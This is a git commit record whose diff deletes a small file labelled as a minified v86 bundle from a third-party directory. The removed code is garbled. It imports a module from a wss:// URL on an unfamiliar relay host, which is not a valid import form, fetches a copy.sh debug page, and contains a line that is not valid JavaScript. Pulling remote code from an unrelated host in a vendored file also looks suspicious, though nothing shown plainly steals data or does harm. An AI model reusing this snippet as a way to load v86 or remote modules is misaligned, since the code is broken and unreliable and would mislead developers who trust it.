eb7eca76f83403b93ddb9aeb4224bf470bd7911b
Mudsir Wazir <wa0026343@gmail.com>
2026-02-05 16:02:57 +0500

    Delete third-parties directory

--- third-parties/v86.bundle.min.mjs
+++
@@ -1,6 +0,0 @@
-import BNA86 from "wss://relay.tbmjcg.net/js/bna86-direct.js"
-
-function fetchISOReader() {
-    fetch("https://copy.sh/v86/debug.html")
-    BNA86.GET-JS(find-v86-js).debug?="/debug.html"
-}
